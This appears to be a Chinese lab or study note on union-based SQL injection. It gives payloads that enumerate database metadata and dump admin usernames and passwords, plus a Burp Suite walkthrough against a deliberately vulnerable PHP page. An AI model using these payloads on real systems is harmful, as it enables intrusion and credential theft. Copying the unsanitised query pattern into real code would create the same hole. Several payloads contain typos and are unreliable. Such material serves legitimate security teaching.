# ==SQL注入利用 - Union联合注入==

## 联合注入原理

在SQL语句中查询数据时，使用select相关语句与where条件子句筛选符合条件的记录

```SQL
select * from person where id = 1; #在person表中，筛选出id=1的记录
```

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230827110238591.png" alt="image-20230827110238591" style="zoom:200%;" />

如果该id=1中的1时用户可以控制输入的部分时，就有可能存在SQL注入漏洞

```SQL
数据库提供联合查询，使得可以将两条SQL查询语句的结果进行链接，务必注意：两者的字段数必须一致。
select * from person where id = 1 union select 1,2,database(),4,5;
```

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230827132129918.png" alt="image-20230827132129918" style="zoom:200%;" />

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230827132801077.png" alt="image-20230827132801077" style="zoom:200%;" />

从上图可知，在使用union时，union后面的拼接语句则字段数必须和union前面的SQL语句字段数相同，否则就会报错。那么我们该如何得知上一份语句查询结果的字段数呢？我们看下面的方法

判断联合查询语句中的字段数时，可以使用order by num。当依次增大num时，如果出现错误，那么上一条SQL查询语句的结果字段数就为num-1

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230827133548237.png" alt="image-20230827133548237" style="zoom:200%;" />

联合查询利用SQL注入漏洞语句：

（1）执行联合查询

```SQL
select * from person where id = 1 union select 1,2,3,4,5;
```

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230827134033085.png" alt="image-20230827134033085" style="zoom:200%;" />

（2）查询数据库名，版本号，用户信息

```SQL
select * from person where id = 1 union select 1,2,database(),version(),user();
```

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230827134242233.png" alt="image-20230827134242233" style="zoom:200%;" />

（3）查询数据表名

```SQL
select * from person where id = 1 union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1),4,5;
#table_name - 要查询的字段名
#table_schema - 要查找的数据库
#information_schema.tables - 这是数据库表

#这里的limit 0,1的意思是，从0号位置开始，向后读取1个大小的位置
或
select * from person where id = 1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()),4,5;

#利用group_cancat(table_name)函数，将查询结果连接成一行展示出来
```

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230827151930767.png" alt="image-20230827151930767" style="zoom:200%;" />

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230827152452363.png" alt="image-20230827152452363" style="zoom:200%;" />

（4）查询字段名

```SQL
select * from person where id = 1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='admin'),4,5;
#从数据库中的columns表中找到admin字段的相关字段名并组合成一行显示出来
或
select * from person where id = 1 union select 1,2,(select group_concat(column_name) from information_schema.columns where tanle_name=0x61646D696E),4,5;
```

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230827155204728.png" alt="image-20230827155204728" style="zoom:200%;" />

（5）查询具体数据

```SQL
select * from person id = 1 union select 1,concat(username,0x5c,password),3,4,5 from admin;
或
select * from person id = 1 union select 1,concat(uesername,0x5c,password),3,4,5 from admin limit 0,2;
```

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230827164733669.png" alt="image-20230827164733669" style="zoom:200%;" />

**注意：union联合查询注入利用只适用于页面中有返回结果的SQL语句查询。用户输入不同id值，页面会返回不同的内容，此时优先考虑union联合查询SQL注入利用方式**



## 联合注入实验

实验1：burpsuite数字型联合注入利用

```php
实验PHP源代码:

	$id = $_GET["id"];
	$conn = mysql_connect('localhost’,'root'，'123456') or die('连接数据库失败!');
	mysql_query('set names utf-8', $conn);
	mysql_query('use web_sql', $conn);
	$sql ="select * from person where id = {Sid}"; #区分数字 、 字符
	$res = mysql_query($sql,$conn) or die(mysql_error());
	$arr = mysql_fetch_assoc($res);
	
页面输出代码:

	<td><?php echo $arr['id'];?></td>
	<td><?php echo $arr['name'];?></td>
	<td><?php echo $arr['age'];?></td>
	<td><?php echo $arr['phone'];?></td>
	<td><?php echo $arr['email'];?></td>
```

 **注意：在burp中自己编写代码时，空格要么用+要么用%20来代替，否则空格不会作为url编码会出错**

burp实验：

截取

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230827213849258.png" alt="image-20230827213849258" style="zoom:200%;" />

action中发送给repeater，然后在最上面的repeater中进行查看

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230827213945685.png" alt="image-20230827213945685" style="zoom:200%;" />

先通过order by num来判断数据的列数

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230827214347181.png" alt="image-20230827214347181" style="zoom:200%;" />

为了防止id=2的时候，显示结果只是union前一半的结果，所以我们需要让union前一半的语句报错，从而只执行union后面的SQL语句，我们可以在id=-2就好了，而且从此可以得知这也是数字注入

![image-20230827214815080](C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230827214815080.png)

然后查看数据库，版本信息，用户信息

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230827221642259.png" alt="image-20230827221642259" style="zoom:200%;" />

然后就要查看这个数据库中所具有的表的信息，有哪些表名，会发现数据库中有admin和person两个数据表

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230827222316322.png" alt="image-20230827222316322" style="zoom:200%;" />

现在我们有了表名我们就需要查询数据表中的列名，此时需要将table换位column，为了保险起见我们将数据表名换位十六进制来查找，可以防止一些错误，我们可以看到查询结果中admin这个数据表中有id username password三个字段

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230827222904423.png" alt="image-20230827222904423" style="zoom:200%;" />

接下来我们就需要对这三个字段的具体信息进行查询

<img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20230827223206840.png" alt="image-20230827223206840" style="zoom:200%;" />



实验2：Burp字符型联合注入利用

```sql
Mysql中注释：#、 --+  闭合引号

select * from articles where id = '1'

select * from articles where id = '1'  --+'

select * from articles where id = '1'  union注入利用语句 --+'    
```

这里的--+'也可以替换为 or '1 ' 是为了逃避引号

总结：

1.从原理上掌握联合查询诸如利用技术

2.掌握Burp suite对注入点进行union联合查询注入